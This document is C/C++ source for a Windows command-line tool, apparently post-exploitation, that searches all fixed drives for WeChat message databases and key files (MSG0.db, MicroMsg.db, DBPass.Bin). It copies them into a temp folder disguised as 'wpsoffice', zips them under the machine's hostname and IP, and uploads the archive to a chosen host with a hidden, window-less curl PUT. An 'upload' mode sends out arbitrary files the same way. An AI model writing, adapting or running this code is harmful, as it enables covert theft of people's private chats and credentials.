#include <Winsock2.h>
#pragma comment(lib, "Ws2_32.lib")
#include <string> 
#include<stdio.h>
#include<iostream>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include "zip.h"
#include "unzip.h"
#include <iostream>
#include<string>
#include <time.h>
#include <fstream>
#include <direct.h>


#define _WINSOCK_DEPRECATED_NO_WARNINGS

void FindFile(char*, char*);
void DirFindFile(char* pfilename, char* pfilter, char* fname, char* tempdir);
int count = 0;
char * fname;
#define BUFSIZE 256



static ZRESULT DirToZip(HZIP& hz, LPCTSTR lpszSrcPath, int nBasePos)
{
	DWORD zResult = ZR_OK;

	WIN32_FIND_DATA fileData;
	TCHAR szFile[MAX_PATH] = { 0 };
	int nStart = _tcslen(lpszSrcPath);
	_tcscpy(szFile, lpszSrcPath);
	if (nStart&&_T('\\') != lpszSrcPath[nStart - 1]) {
		if (nBasePos == nStart) nBasePos++;
		szFile[nStart++] = _T('\\');
	}
	_tcscpy(szFile + nStart, _T("*"));
	HANDLE file = FindFirstFile(szFile, &fileData);
	while (FindNextFile(file, &fileData))
	{
		if (fileData.cFileName[0] == _T('.'))
			continue;
		_tcscpy(szFile + nStart, fileData.cFileName);
		// 如果是一个文件目录
		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			ZipAddFolder(hz, szFile + nBasePos);
			// 存在子文件夹 递归调用
			DirToZip(hz, szFile, nBasePos);
		}
		else
		{
			zResult = ZipAdd(hz, szFile + nBasePos, szFile);
			// if (zResult != ZR_OK) return zResult;
		}
	}
	return zResult;
}


char *Upload(char *File,char *domain) 
{
	char str3[255];
	printf("\n");
	static TCHAR SaveFile[MAX_PATH];
	strcat(SaveFile, ("curl.exe -X PUT --upload-file "));
	strcat(SaveFile, File);
	strcat(SaveFile, " ");
	strcat(SaveFile, domain);
	//strcat(SaveFile, str3);
	//strcat(SaveFile, TEXT(" -H "));
	//strcat(SaveFile, domain);
	printf(SaveFile);
	//ShellExecute(NULL, "open", SaveFile, NULL, NULL, SW_SHOW);
	//ShellExecuteA(NULL, "open", "curl.exe ", SaveFile, NULL, SW_SHOW);
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION   ProcessInfo;
	GetStartupInfo(&StartupInfo);
	StartupInfo.lpReserved = NULL;
	StartupInfo.lpDesktop = NULL;
	StartupInfo.lpTitle = NULL;
	StartupInfo.dwX = 0;
	StartupInfo.dwY = 0;
	StartupInfo.dwXSize = 0;
	StartupInfo.dwYSize = 0;
	StartupInfo.dwXCountChars = 500;
	StartupInfo.dwYCountChars = 500;
	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.cbReserved2 = 0;
	StartupInfo.lpReserved2 = NULL;
	StartupInfo.hStdInput = stdin;
	StartupInfo.hStdOutput = stdout;
	StartupInfo.hStdError = stderr;
	CreateProcessA(NULL, SaveFile, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartupInfo, &ProcessInfo);
	//}
	return 0;
}

void usage()
{
	printf("[+] eg: Filesearch default baidu.com \n");
	printf("[+] eg: Filesearch upload C:\\MSG0.db baidu.com \n");
	printf("[+] eg: Filesearch search C:\\ docx \n");
}


int main(int argc,char* argv[])
{
	if (argc < 2) {
		usage();
		return -1;
	}

	char szLogicalDriveStrings[BUFSIZE];
	DWORD iLength;
	int iSub;
	char cwd[256];
	_getcwd(cwd, 256);
	printf("Current Path:%s\n", cwd);
	iLength = GetLogicalDriveStringsA(BUFSIZE - 1, szLogicalDriveStrings);
	printf("System Drive are:");
	for (iSub = 0; iSub < iLength; iSub += 4)
	{
		if (GetDriveType((LPCSTR)szLogicalDriveStrings + iSub) != 3)
			continue;
		printf(szLogicalDriveStrings + iSub);
	}
	printf("\n");


	// 初始化套接字库
	WORD wVersionRequested = MAKEWORD(2, 0); // 套接字版本
	WSADATA data;
	int nRes = ::WSAStartup(wVersionRequested, &data);


	char HostName[128];
	gethostname(HostName, sizeof(HostName));// 获得本机主机名.
	hostent* hn;
	hn = gethostbyname(HostName);//根据本机主机名得到本机ip
	char *chIP = inet_ntoa(*(struct in_addr *)hn->h_addr_list[0]);//把ip换成字符串形式
	::WSACleanup();


	if (strcmp(argv[1], "default") == 0)
	{

		char szLogicalDriveStrings[BUFSIZE];
		DWORD iLength;
		int iSub;

		char strTmpPath[MAX_PATH];
		static TCHAR tempdir[MAX_PATH];

		// 创建临时文件夹
		GetTempPath(sizeof(strTmpPath), strTmpPath);
		strcat(strTmpPath, "\\");
		char szDirName[] = "wpsoffice";
		strcat(tempdir, strTmpPath);
		strcat(tempdir, szDirName);
		CreateDirectory(tempdir, NULL);
		printf("%s...\n", tempdir);


		static TCHAR SaveFile[MAX_PATH];
		static TCHAR tempzip[MAX_PATH];

		strcat_s(HostName, "_db_");
		strcat_s(HostName, chIP);
		strcat_s(HostName, ".zip");

		const char* filetype[] = { "MSG0.db","MicroMsg.db","DBPass.Bin","MSG1.db" ,"MSG2.db" };

		ZeroMemory(szLogicalDriveStrings, BUFSIZE);
		iLength = GetLogicalDriveStringsA(BUFSIZE - 1, szLogicalDriveStrings);
		for (iSub = 0; iSub < iLength; iSub += 4)
		{
			for (int i = 0; i < 5; i++)
			{
				DirFindFile((char *)szLogicalDriveStrings + iSub, (char *)"*.*", (char *)filetype[i], tempdir);
			}

		}
		strcat_s(tempzip, strTmpPath);
		strcat_s(tempzip, HostName);
		printf(tempzip);
		DWORD zResult = ZR_OK;
		HZIP hz = CreateZip(tempzip, 0);
		LPCTSTR lpszSrcPath = tempdir;
		zResult = DirToZip(hz, lpszSrcPath, _tcsclen(lpszSrcPath));
		CloseZip(hz);
		Upload(tempzip,argv[2]);

	}




	if (strcmp(argv[1], "upload") == 0) 

	{
		char name[20];
		//char *file = randstr(name, 7);
		WORD wVersionRequested = MAKEWORD(2, 0);
		WSADATA data;


		char strBuffer[256] = { 0 };
		strcat_s(HostName, "_");
		char fn[30], *p;
   
		strcpy(fn, (p = strrchr(argv[2], '\\')) ? p + 1 : argv[3]); //获取文件名
		//printf("%s\n", fn);
		strcat_s(HostName, fn);
		strcat_s(HostName, "_");
		strcat_s(HostName, ".zip");
		//printf("%s...\n", HostName);
		DWORD zResult = ZR_OK;
		HZIP hz = CreateZip(HostName, 0);

		zResult = ZipAdd(hz, fn, argv[2]);
		CloseZip(hz);
		Upload(HostName, argv[3]);

	}

	if (strcmp(argv[1], "search") == 0)
	{


		ZeroMemory(szLogicalDriveStrings, BUFSIZE);
		const char *str7 = argv[2];
		fname = argv[3];
		FindFile((char *)str7, (char *)"*.*");
		printf("一共%s文件...\n", count);
		return 0;

	}

}


void DirFindFile(char* pfilename, char* pfilter, char* fname, char* tempdir)
{

	WIN32_FIND_DATA findfiledate;
	HANDLE hfind;
	char filename[1000];
	char lpFileName[1000];
	char _lpFileName[1000];


	char source[1000];
	char target[1000];

	int i;
	for (i = 0; *(pfilename + i) != '\0'; i++)
		filename[i] = *(pfilename + i);
	filename[i] = '\0';
	if (filename[strlen(filename) - 1] != '\\')
		strcat(filename, "\\"); //添加'\'
	strcpy(lpFileName, filename);
	strcat(lpFileName, pfilter);
	hfind = FindFirstFile(lpFileName, &findfiledate);
	if (hfind == INVALID_HANDLE_VALUE)
		return;
	do
	{
		if (!(findfiledate.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY))
		{
			//如果找到指定文件
			if (strcmp(findfiledate.cFileName, fname) == 0)
			{
				printf("%s%s\n", filename, findfiledate.cFileName);
				////strcat_s(SaveFile, strlen(filename) + 1,filename);
				////strcat_s(SaveFile, findfiledate.cFileName);
				//strcat(SaveFile, filename);



				lstrcpy(source, filename);
				lstrcpy(target, tempdir);
				lstrcat(source, "\\*.*");
				lstrcat(target, "\\");


				memset(source, '0', sizeof(source));
				lstrcpy(source, filename);
				lstrcat(source, "\\");
				lstrcat(source, findfiledate.cFileName);
				lstrcat(target, findfiledate.cFileName);
				CopyFile(source, target, TRUE);
				count++;
			}
		}
		else
		{
			if (findfiledate.cFileName[0] != '.')
			{
				strcpy(_lpFileName, filename);
				strcat(_lpFileName, (const char*)findfiledate.cFileName);
				DirFindFile(_lpFileName, pfilter, fname, tempdir);
			}
		}
	} while (FindNextFile(hfind, &findfiledate));
	FindClose(hfind);

}


void FindFile(char* pfilename, char* pfilter)
{
	WIN32_FIND_DATA findfiledate;
	HANDLE hfind;
	char filename[512];
	char lpFileName[512];
	char _lpFileName[512];
	int i;
	for (i = 0; *(pfilename + i) != '\0'; i++)
		filename[i] = *(pfilename + i);
	filename[i] = '\0';
	//如果最后一字符不是'\'
	if (filename[strlen(filename) - 1] != '\\')
		strcat(filename, "\\"); //添加'\'
	strcpy(lpFileName, filename);
	strcat(lpFileName, pfilter);
	hfind = FindFirstFile(lpFileName, &findfiledate);
	if (hfind == INVALID_HANDLE_VALUE)
		return;
	do
	{
		if (!(findfiledate.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY))
		{
			//如果找到指定文件
			if (strstr(findfiledate.cFileName, fname))
			{

				printf("%s%s\n", filename, findfiledate.cFileName);
				count++;
			}
		}
		else
		{
			if (findfiledate.cFileName[0] != '.')
			{
				strcpy(_lpFileName, filename);
				strcat(_lpFileName, (const char*)findfiledate.cFileName);
				FindFile(_lpFileName, pfilter);  
			}
		}
	} while (FindNextFile(hfind, &findfiledate));
	FindClose(hfind);

}